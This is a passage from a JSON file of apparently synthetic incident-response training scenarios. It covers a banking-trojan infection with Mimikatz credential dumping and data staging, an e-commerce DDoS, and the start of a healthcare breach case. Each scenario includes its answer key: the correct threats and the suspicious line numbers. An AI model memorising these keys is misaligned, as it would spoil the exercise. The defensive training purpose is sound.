          {"text": "2025-04-20T11:50:15Z WARNING [Net.Connection] Process: powershell.exe (PID: 5022), Local: 10.50.20.42:50445, Remote: 185.129.62.48:443, State: ESTABLISHED, Protocol: HTTPS"}
        ]
      },
      {
        "id": "file_log",
        "name": "File Operation Events",
        "type": "filesystem",
        "timestamp": "2025-04-20",
        "source": "endpoint-FNWKS042",
        "content": [
          {"text": "2025-04-20T09:15:40Z INFO [File.Create] User: FINBANK\\mwilliams, Process: outlook.exe (PID: 4582), Path: C:\\Users\\mwilliams\\AppData\\Local\\Microsoft\\Outlook\\Q2_Projections.msg"},
          {"text": "2025-04-20T09:22:12Z INFO [File.Create] User: FINBANK\\mwilliams, Process: outlook.exe (PID: 4582), Path: C:\\Users\\mwilliams\\Downloads\\Q2_Financial_Summary.doc"},
          {"text": "2025-04-20T09:22:16Z INFO [File.Read] User: FINBANK\\mwilliams, Process: winword.exe (PID: 4612), Path: C:\\Users\\mwilliams\\Downloads\\Q2_Financial_Summary.doc"},
          {"text": "2025-04-20T09:22:20Z INFO [File.Create] User: FINBANK\\mwilliams, Process: EXCEL.EXE (PID: 4628), Path: C:\\Users\\mwilliams\\Downloads\\MacroEnabled.xlsm"},
          {"text": "2025-04-20T09:22:33Z WARNING [File.Create] User: FINBANK\\mwilliams, Process: powershell.exe (PID: 4652), Path: C:\\Temp\\sys32.exe"},
          {"text": "2025-04-20T09:22:40Z WARNING [File.Modify] User: FINBANK\\mwilliams, Process: sys32.exe (PID: 4670), Path: C:\\Windows\\System32\\drivers\\etc\\hosts"},
          {"text": "2025-04-20T09:45:25Z WARNING [File.Create] User: SYSTEM, Process: sys32.exe (PID: 4712), Path: C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\svchost.dll"},
          {"text": "2025-04-20T09:45:35Z WARNING [File.Modify] User: SYSTEM, Process: regsvr32.exe (PID: 4725), Path: C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Temp\\svchost.dll"},
          {"text": "2025-04-20T09:50:10Z WARNING [File.Create] User: SYSTEM, Process: sys32.exe (PID: 4712), Path: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\updater.lnk"},
          {"text": "2025-04-20T10:15:45Z INFO [File.Read] User: FINBANK\\mwilliams, Process: iexplore.exe (PID: 4825), Path: C:\\Users\\mwilliams\\Downloads\\client_records.xlsx"},
          {"text": "2025-04-20T10:22:45Z WARNING [File.Create] User: SYSTEM, Process: sys32.exe (PID: 4712), Path: C:\\Temp\\mimikatz.exe"},
          {"text": "2025-04-20T10:23:15Z WARNING [File.Create] User: SYSTEM, Process: mimikatz.exe (PID: 4840), Path: C:\\Temp\\credentials.txt"},
          {"text": "2025-04-20T10:30:22Z WARNING [File.Read] User: SYSTEM, Process: sys32.exe (PID: 4712), Path: C:\\Windows\\NTDS\\ntds.dit (Access Denied)"},
          {"text": "2025-04-20T11:15:45Z WARNING [File.Create] User: SYSTEM, Process: sys32.exe (PID: 4712), Path: C:\\Temp\\staging\\"},
          {"text": "2025-04-20T11:22:35Z WARNING [File.Copy] User: SYSTEM, Process: cmd.exe (PID: 4950), Path: C:\\Users\\mwilliams\\AppData\\Roaming\\Microsoft\\Windows\\Templates\\Normal.dotm -> C:\\Temp\\data.bin"},
          {"text": "2025-04-20T11:45:30Z WARNING [File.Copy] User: SYSTEM, Process: powershell.exe (PID: 5022), Path: Multiple .xlsx files -> C:\\Temp\\staging\\"},
          {"text": "2025-04-20T11:50:22Z WARNING [File.Create] User: SYSTEM, Process: sys32.exe (PID: 4712), Path: C:\\Temp\\exfil.zip"}
        ]
      },
      {
        "id": "registry_log",
        "name": "Registry Operation Events",
        "type": "registry",
        "timestamp": "2025-04-20",
        "source": "endpoint-FNWKS042",
        "content": [
          {"text": "2025-04-20T09:45:30Z WARNING [Reg.Modify] User: SYSTEM, Process: sys32.exe (PID: 4712), Path: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemService, Value: C:\\Temp\\sys32.exe"},
          {"text": "2025-04-20T09:46:15Z WARNING [Reg.Modify] User: SYSTEM, Process: sys32.exe (PID: 4712), Path: HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List, Value: C:\\Temp\\sys32.exe:*:Enabled:System Service"},
          {"text": "2025-04-20T09:50:22Z WARNING [Reg.Modify] User: SYSTEM, Process: sys32.exe (PID: 4712), Path: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\\Startup, Value: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\"},
          {"text": "2025-04-20T10:15:45Z WARNING [Reg.Read] User: SYSTEM, Process: sys32.exe (PID: 4712), Path: HKLM\\SAM"},
          {"text": "2025-04-20T10:22:33Z WARNING [Reg.Read] User: SYSTEM, Process: mimikatz.exe (PID: 4840), Path: HKLM\\SECURITY"},
          {"text": "2025-04-20T10:22:45Z WARNING [Reg.Read] User: SYSTEM, Process: mimikatz.exe (PID: 4840), Path: HKLM\\SYSTEM"},
          {"text": "2025-04-20T11:15:22Z WARNING [Reg.Modify] User: SYSTEM, Process: sys32.exe (PID: 4712), Path: HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Defaults\\Provider\\Microsoft Enhanced RSA and AES Cryptographic Provider"}
        ]
      }
    ],
    "threats": [
      {
        "type": "malware",
        "name": "Banking Trojan Infection",
        "description": "System infected with banking trojan via malicious Office document with macro payload."
      },
      {
        "type": "credential_theft",
        "name": "Credential Harvesting",
        "description": "Attacker using Mimikatz to extract Windows credentials and access network resources."
      },
      {
        "type": "data_exfiltration",
        "name": "Financial Data Theft",
        "description": "Unauthorized collection and exfiltration of financial documents to external servers."
      }
    ],
    "threatOptions": [
      {
        "type": "malware",
        "name": "Banking Trojan Infection",
        "description": "System infected with banking trojan via malicious Office document with macro payload."
      },
      {
        "type": "credential_theft",
        "name": "Credential Harvesting",
        "description": "Attacker using Mimikatz to extract Windows credentials and access network resources."
      },
      {
        "type": "data_exfiltration",
        "name": "Financial Data Theft",
        "description": "Unauthorized collection and exfiltration of financial documents to external servers."
      },
      {
        "type": "intrusion",
        "name": "Lateral Movement",
        "description": "Attacker moving to other systems in the network using stolen credentials."
      },
      {
        "type": "malware",
        "name": "Keylogger Installation",
        "description": "Malware that records keystrokes to capture banking credentials as they're typed."
      },
      {
        "type": "malware",
        "name": "Form Grabber",
        "description": "Malicious code that captures form submissions from banking websites."
      },
      {
        "type": "intrusion",
        "name": "DLL Injection",
        "description": "Technique of running arbitrary code in the context of another process by forcing it to load a malicious DLL."
      },
      {
        "type": "credential_theft",
        "name": "Browser Password Theft",
        "description": "Extraction of saved credentials from web browsers' password stores."
      },
      {
        "type": "intrusion",
        "name": "Registry Persistence",
        "description": "Modification of Windows registry to ensure malware runs after system restart."
      },
      {
        "type": "malware",
        "name": "Remote Access Trojan (RAT)",
        "description": "Malware that allows an attacker to control the system remotely through a backdoor."
      },
      {
        "type": "credential_theft",
        "name": "Network Credential Theft",
        "description": "Capturing authentication material transmitted over the network."
      },
      {
        "type": "data_exfiltration",
        "name": "Document Metadata Theft",
        "description": "Extraction of document properties and metadata that may contain sensitive information."
      },
      {
        "type": "intrusion",
        "name": "Scheduled Task Persistence",
        "description": "Use of Windows Task Scheduler to maintain access to the compromised system."
      },
      {
        "type": "malware",
        "name": "Man-in-the-Browser Attack",
        "description": "Browser-focused malware that can modify web pages, change transaction content, or insert fields into forms."
      }
    ],
    "suspiciousLines": [3, 4, 5, 6, 7, 9, 10, 11, 12, 14, 15, 16, 17, 19, 21, 23, 25, 26, 29, 30, 31, 32, 33, 34, 36, 38, 39, 40, 41, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 58, 59, 60, 61, 62, 63],
    "knownEntities": {
      "ips": [
        {"address": "10.50.20.42", "info": "Finance Workstation - FNWKS042"},
        {"address": "10.50.1.25", "info": "Exchange Email Server"},
        {"address": "10.50.1.15", "info": "Intranet Web Server"},
        {"address": "10.50.1.100", "info": "File Server"},
        {"address": "185.129.62.48", "info": "Unknown External IP"},
        {"address": "91.243.87.22", "info": "Unknown External IP"}
      ],
      "users": [
        {"username": "FINBANK\\mwilliams", "role": "Financial Analyst"},
        {"username": "FINBANK\\admin.svc", "role": "Service Account"}
      ]
    }
  },
  {
    "id": "scenario7",
    "title": "E-commerce DDoS Attack",
    "description": "Analyze web server logs for evidence of a Distributed Denial of Service attack targeting an e-commerce platform.",
    "threatType": "ddos",
    "difficulty": 1,
    "timeLimit": 330,
    "logs": [
      {
        "id": "access_log",
        "name": "Web Server Access Log",
        "type": "web",
        "timestamp": "2025-04-21",
        "source": "web-server-cluster",
        "content": [
          {"text": "103.26.44.33 - - [21/Apr/2025:08:15:22 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "45.152.84.57 - - [21/Apr/2025:08:15:25 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "103.26.44.33 - - [21/Apr/2025:08:15:28 +0000] \"GET /products HTTP/1.1\" 200 4528 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "45.152.84.57 - - [21/Apr/2025:08:15:35 +0000] \"GET /products HTTP/1.1\" 200 4528 \"https://shop.example.com/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "103.26.44.33 - - [21/Apr/2025:08:16:05 +0000] \"GET /products/12345 HTTP/1.1\" 200 3856 \"https://shop.example.com/products\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "45.152.84.57 - - [21/Apr/2025:08:16:15 +0000] \"GET /products/56789 HTTP/1.1\" 200 3922 \"https://shop.example.com/products\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "185.173.35.42 - - [21/Apr/2025:09:00:01 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.42 - - [21/Apr/2025:09:00:02 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.43 - - [21/Apr/2025:09:00:02 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.44 - - [21/Apr/2025:09:00:02 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.45 - - [21/Apr/2025:09:00:02 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.46 - - [21/Apr/2025:09:00:03 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.47 - - [21/Apr/2025:09:00:03 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.48 - - [21/Apr/2025:09:00:03 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.49 - - [21/Apr/2025:09:00:03 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.50 - - [21/Apr/2025:09:00:04 +0000] \"GET / HTTP/1.1\" 200 2340 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "92.118.37.12 - - [21/Apr/2025:09:15:22 +0000] \"GET /checkout HTTP/1.1\" 200 5621 \"https://shop.example.com/cart\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1\""},
          {"text": "91.243.87.22 - - [21/Apr/2025:09:20:33 +0000] \"GET /search?q=laptop HTTP/1.1\" 200 4825 \"-\" \"Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36\""},
          {"text": "185.173.35.42 - - [21/Apr/2025:09:30:01 +0000] \"GET /search?q=a HTTP/1.1\" 200 4528 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.43 - - [21/Apr/2025:09:30:01 +0000] \"GET /search?q=b HTTP/1.1\" 200 4482 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.44 - - [21/Apr/2025:09:30:01 +0000] \"GET /search?q=c HTTP/1.1\" 200 4502 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.45 - - [21/Apr/2025:09:30:01 +0000] \"GET /search?q=d HTTP/1.1\" 200 4490 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.46 - - [21/Apr/2025:09:30:02 +0000] \"GET /search?q=e HTTP/1.1\" 200 4521 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.47 - - [21/Apr/2025:09:30:02 +0000] \"GET /search?q=f HTTP/1.1\" 200 4475 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.48 - - [21/Apr/2025:09:30:02 +0000] \"GET /search?q=g HTTP/1.1\" 200 4488 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.49 - - [21/Apr/2025:09:30:02 +0000] \"GET /search?q=h HTTP/1.1\" 200 4492 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.50 - - [21/Apr/2025:09:30:03 +0000] \"GET /search?q=i HTTP/1.1\" 200 4505 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "103.26.44.33 - - [21/Apr/2025:09:45:15 +0000] \"POST /api/cart/add HTTP/1.1\" 200 582 \"https://shop.example.com/products/12345\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "45.152.84.57 - - [21/Apr/2025:09:46:22 +0000] \"GET /cart HTTP/1.1\" 200 3827 \"https://shop.example.com/products/56789\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\""},
          {"text": "185.173.35.42 - - [21/Apr/2025:10:00:01 +0000] \"GET /api/products HTTP/1.1\" 200 12485 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.42 - - [21/Apr/2025:10:00:01 +0000] \"GET /api/products HTTP/1.1\" 200 12485 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.43 - - [21/Apr/2025:10:00:01 +0000] \"GET /api/products HTTP/1.1\" 200 12485 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.44 - - [21/Apr/2025:10:00:01 +0000] \"GET /api/products HTTP/1.1\" 200 12485 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.45 - - [21/Apr/2025:10:00:01 +0000] \"GET /api/products HTTP/1.1\" 200 12485 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.46 - - [21/Apr/2025:10:00:01 +0000] \"GET /api/products HTTP/1.1\" 200 12485 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.47 - - [21/Apr/2025:10:00:01 +0000] \"GET /api/products HTTP/1.1\" 200 12485 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.48 - - [21/Apr/2025:10:00:01 +0000] \"GET /api/products HTTP/1.1\" 200 12485 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.49 - - [21/Apr/2025:10:00:01 +0000] \"GET /api/products HTTP/1.1\" 200 12485 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.50 - - [21/Apr/2025:10:00:01 +0000] \"GET /api/products HTTP/1.1\" 200 12485 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""},
          {"text": "185.173.35.51 - - [21/Apr/2025:10:00:01 +0000] \"GET /api/products HTTP/1.1\" 200 12485 \"-\" \"Mozilla/5.0 (compatible; BTSearchBot/1.0; +http://btbot.com/bot.html)\""}
        ]
      },
      {
        "id": "error_log",
        "name": "Web Server Error Log",
        "type": "error",
        "timestamp": "2025-04-21",
        "source": "web-server-cluster",
        "content": [
          {"text": "[Tue Apr 21 10:15:22 2025] [warn] [client 185.173.35.48] ModSecurity: Warning. Matched phrase \"bot\" at REQUEST_HEADERS:User-Agent. [file \"/etc/modsecurity/rules/bots.conf\"] [line \"15\"] [id \"990012\"] [rev \"1\"] [msg \"Suspicious Bot Activity\"] [severity \"WARNING\"] [hostname \"shop.example.com\"] [uri \"/api/products\"] [unique_id \"YKJs2MCoAXUXs4EmPHwWYwAAAAA\"]"},
          {"text": "[Tue Apr 21 10:15:25 2025] [warn] [client 185.173.35.49] ModSecurity: Warning. Matched phrase \"bot\" at REQUEST_HEADERS:User-Agent. [file \"/etc/modsecurity/rules/bots.conf\"] [line \"15\"] [id \"990012\"] [rev \"1\"] [msg \"Suspicious Bot Activity\"] [severity \"WARNING\"] [hostname \"shop.example.com\"] [uri \"/api/products\"] [unique_id \"YKJs2MCoAXUXs4EmPHwWZwAAAAA\"]"},
          {"text": "[Tue Apr 21 10:15:28 2025] [warn] [client 185.173.35.50] ModSecurity: Warning. Matched phrase \"bot\" at REQUEST_HEADERS:User-Agent. [file \"/etc/modsecurity/rules/bots.conf\"] [line \"15\"] [id \"990012\"] [rev \"1\"] [msg \"Suspicious Bot Activity\"] [severity \"WARNING\"] [hostname \"shop.example.com\"] [uri \"/api/products\"] [unique_id \"YKJs2MCoAXUXs4EmPHwWawAAAAA\"]"},
          {"text": "[Tue Apr 21 10:15:35 2025] [error] [client 185.173.35.42] ModSecurity: Access denied with code 403 (phase 2). Matched phrase \"excessive requests\" at REQUEST_HEADERS. Too many requests in a short period from this client IP. [file \"/etc/modsecurity/rules/dos.conf\"] [line \"28\"] [id \"990022\"] [rev \"2\"] [msg \"Potential DoS Attack\"] [severity \"CRITICAL\"] [hostname \"shop.example.com\"] [uri \"/api/products\"] [unique_id \"YKJs2MCoAXUXs4EmPHwWbwAAAAA\"]"},
          {"text": "[Tue Apr 21 10:15:38 2025] [error] [client 185.173.35.43] ModSecurity: Access denied with code 403 (phase 2). Matched phrase \"excessive requests\" at REQUEST_HEADERS. Too many requests in a short period from this client IP. [file \"/etc/modsecurity/rules/dos.conf\"] [line \"28\"] [id \"990022\"] [rev \"2\"] [msg \"Potential DoS Attack\"] [severity \"CRITICAL\"] [hostname \"shop.example.com\"] [uri \"/api/products\"] [unique_id \"YKJs2MCoAXUXs4EmPHwWcwAAAAA\"]"},
          {"text": "[Tue Apr 21 10:15:42 2025] [error] [client 185.173.35.44] ModSecurity: Access denied with code 403 (phase 2). Matched phrase \"excessive requests\" at REQUEST_HEADERS. Too many requests in a short period from this client IP. [file \"/etc/modsecurity/rules/dos.conf\"] [line \"28\"] [id \"990022\"] [rev \"2\"] [msg \"Potential DoS Attack\"] [severity \"CRITICAL\"] [hostname \"shop.example.com\"] [uri \"/api/products\"] [unique_id \"YKJs2MCoAXUXs4EmPHwWdwAAAAA\"]"},
          {"text": "[Tue Apr 21 10:16:05 2025] [warn] [client 185.173.35.51] ModSecurity: Warning. Match of \"rx ^Mozilla\" against \"REQUEST_HEADERS:User-Agent\" required. [file \"/etc/modsecurity/rules/scanners.conf\"] [line \"49\"] [id \"990006\"] [rev \"1\"] [msg \"Invalid User Agent\"] [severity \"WARNING\"] [hostname \"shop.example.com\"] [uri \"/api/products\"] [unique_id \"YKJs2MCoAXUXs4EmPHwWeAAAAA\"]"},
          {"text": "[Tue Apr 21 10:30:22 2025] [error] Server reached MaxClients setting, consider raising the MaxClients setting"},
          {"text": "[Tue Apr 21 10:30:25 2025] [error] Server reached MaxRequestWorkers setting, consider raising the MaxRequestWorkers setting"},
          {"text": "[Tue Apr 21 10:30:45 2025] [crit] [client 185.173.35.42] (12)Cannot allocate memory: Fork: Unable to fork new process"},
          {"text": "[Tue Apr 21 10:31:15 2025] [alert] [client 185.173.35.43] mod_evasive[20029]: Blacklisting address 185.173.35.43: possible DoS attack."},
          {"text": "[Tue Apr 21 10:31:18 2025] [alert] [client 185.173.35.44] mod_evasive[20029]: Blacklisting address 185.173.35.44: possible DoS attack."},
          {"text": "[Tue Apr 21 10:31:22 2025] [alert] [client 185.173.35.45] mod_evasive[20029]: Blacklisting address 185.173.35.45: possible DoS attack."},
          {"text": "[Tue Apr 21 10:45:22 2025] [error] [client 45.152.84.57] File does not exist: /var/www/html/favicon.ico"}
        ]
      },
      {
        "id": "performance_log",
        "name": "Server Performance Metrics",
        "type": "performance",
        "timestamp": "2025-04-21",
        "source": "web-server-cluster",
        "content": [
          {"text": "2025-04-21T08:00:00Z INFO CPU: 15%, Memory: 35%, ActiveConnections: 42, RequestsPerSecond: 28"},
          {"text": "2025-04-21T08:30:00Z INFO CPU: 18%, Memory: 38%, ActiveConnections: 56, RequestsPerSecond: 35"},
          {"text": "2025-04-21T09:00:00Z INFO CPU: 25%, Memory: 42%, ActiveConnections: 124, RequestsPerSecond: 75"},
          {"text": "2025-04-21T09:30:00Z WARNING CPU: 45%, Memory: 62%, ActiveConnections: 356, RequestsPerSecond: 215"},
          {"text": "2025-04-21T10:00:00Z CRITICAL CPU: 92%, Memory: 88%, ActiveConnections: 1245, RequestsPerSecond: 845"},
          {"text": "2025-04-21T10:15:00Z CRITICAL CPU: 98%, Memory: 95%, ActiveConnections: 2856, RequestsPerSecond: 1256"},
          {"text": "2025-04-21T10:30:00Z CRITICAL CPU: 100%, Memory: 97%, ActiveConnections: 4521, RequestsPerSecond: ERROR - Service unresponsive"},
          {"text": "2025-04-21T10:45:00Z CRITICAL CPU: 100%, Memory: 98%, ActiveConnections: 3845, RequestsPerSecond: 185 - WAF active"},
          {"text": "2025-04-21T11:00:00Z WARNING CPU: 75%, Memory: 82%, ActiveConnections: 524, RequestsPerSecond: 125 - Rate limiting active"}
        ]
      },
      {
        "id": "waf_log",
        "name": "Web Application Firewall Logs",
        "type": "waf",
        "timestamp": "2025-04-21",
        "source": "cloudflare-waf",
        "content": [
          {"text": "2025-04-21T09:55:22Z INFO [WAF] Rule ID: 981176, Action: CHALLENGE, Client IP: 185.173.35.42, Reason: Excessive request rate"},
          {"text": "2025-04-21T09:55:25Z INFO [WAF] Rule ID: 981176, Action: CHALLENGE, Client IP: 185.173.35.43, Reason: Excessive request rate"},
          {"text": "2025-04-21T09:58:15Z INFO [WAF] Rule ID: 981176, Action: CHALLENGE, Client IP: 185.173.35.44, Reason: Excessive request rate"},
          {"text": "2025-04-21T10:02:33Z INFO [WAF] Rule ID: 981176, Action: CHALLENGE, Client IP: 185.173.35.45, Reason: Excessive request rate"},
          {"text": "2025-04-21T10:05:45Z WARNING [WAF] Rule ID: 949110, Action: BLOCK, Client IP: 185.173.35.42, Reason: Bot signature detected"},
          {"text": "2025-04-21T10:05:48Z WARNING [WAF] Rule ID: 949110, Action: BLOCK, Client IP: 185.173.35.43, Reason: Bot signature detected"},
          {"text": "2025-04-21T10:08:22Z WARNING [WAF] Rule ID: 949110, Action: BLOCK, Client IP: 185.173.35.44, Reason: Bot signature detected"},
          {"text": "2025-04-21T10:15:33Z CRITICAL [WAF] Attack campaign detected: Multiple IPs from subnet 185.173.35.0/24 triggering rate limits"},
          {"text": "2025-04-21T10:18:45Z CRITICAL [WAF] DDoS Protection enabled: Rate limiting all requests from subnet 185.173.35.0/24"},
          {"text": "2025-04-21T10:25:22Z INFO [WAF] Rule ID: 981176, Action: BLOCK, Client IP: 83.97.20.34, Reason: Excessive request rate"},
          {"text": "2025-04-21T10:28:15Z INFO [WAF] Rule ID: 981176, Action: BLOCK, Client IP: 83.97.20.35, Reason: Excessive request rate"},
          {"text": "2025-04-21T10:32:22Z CRITICAL [WAF] Attack campaign detected: Multiple IPs from subnet 83.97.20.0/24 triggering rate limits"},
          {"text": "2025-04-21T10:45:15Z INFO [WAF] DDoS mitigation active: Protected origin infrastructure from 4250 req/s attack traffic"},
          {"text": "2025-04-21T11:05:22Z INFO [WAF] DDoS attack traffic decreasing: Current rate 850 req/s, down from peak of 4250 req/s"}
        ]
      }
    ],
    "threats": [
      {
        "type": "ddos",
        "name": "HTTP Flood Attack",
        "description": "Coordinated high-volume HTTP GET requests from multiple source IPs targeting the site's API endpoints."
      },
      {
        "type": "ddos",
        "name": "Botnet-driven DDoS",
        "description": "Attack traffic originating from compromised machines using bot identifiers in user agent strings."
      }
    ],
    "threatOptions": [
      {
        "type": "ddos",
        "name": "HTTP Flood Attack",
        "description": "Coordinated high-volume HTTP GET requests from multiple source IPs targeting the site's API endpoints."
      },
      {
        "type": "ddos",
        "name": "Botnet-driven DDoS",
        "description": "Attack traffic originating from compromised machines using bot identifiers in user agent strings."
      },
      {
        "type": "ddos",
        "name": "Application Layer DDoS",
        "description": "Attack targeting specific application functionality to exhaust server resources."
      },
      {
        "type": "malware",
        "name": "Web Scraping Bot",
        "description": "Automated bots extracting product information and pricing from e-commerce platform."
      },
      {
        "type": "intrusion",
        "name": "WAF Bypass Attempt",
        "description": "Structured attempts to circumvent web application firewall rules."
      },
      {
        "type": "ddos",
        "name": "Slow Loris Attack",
        "description": "Attack keeping many connections open to the target server by sending partial HTTP requests."
      },
      {
        "type": "intrusion",
        "name": "Search Query Injection",
        "description": "Manipulated search queries attempting to trigger expensive database operations."
      },
      {
        "type": "ddos",
        "name": "SYN Flood Attack",
        "description": "TCP-based attack exploiting the three-way handshake to exhaust server resources."
      },
      {
        "type": "credential_theft",
        "name": "Credential Stuffing",
        "description": "Automated attacks using stolen username/password pairs across multiple sites."
      },
      {
        "type": "ddos",
        "name": "DNS Amplification",
        "description": "Attack using DNS servers to multiply traffic volume against the target."
      },
      {
        "type": "ddos",
        "name": "Resource Exhaustion",
        "description": "Targeting CPU-intensive operations to deplete server computing resources."
      },
      {
        "type": "intrusion",
        "name": "API Abuse",
        "description": "Excessive queries to API endpoints attempting to extract data or cause service degradation."
      }
    ],
    "suspiciousLines": [6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84],
    "knownEntities": {
      "ips": [
        {"address": "103.26.44.33", "info": "Legitimate customer - Europe"},
        {"address": "45.152.84.57", "info": "Legitimate customer - North America"},
        {"address": "92.118.37.12", "info": "Legitimate customer - Asia"},
        {"address": "91.243.87.22", "info": "Legitimate customer - Europe"},
        {"address": "185.173.35.0/24", "info": "Suspicious subnet - Eastern Europe"},
        {"address": "83.97.20.0/24", "info": "Suspicious subnet - Russia"}
      ],
      "users": []
    }
  },
  {
    "id": "scenario8",
    "title": "Healthcare Data Breach",
    "description": "Investigate suspicious activity in a healthcare organization's database system that might indicate unauthorized access to patient records.",
    "threatType": "intrusion",
    "difficulty": 3,
    "timeLimit": 450,
    "logs": [
      {
        "id": "database_log",
        "name": "Database Access Log",
        "type": "database",
        "timestamp": "2025-04-22",
        "source": "healthdb-main",
        "content": [
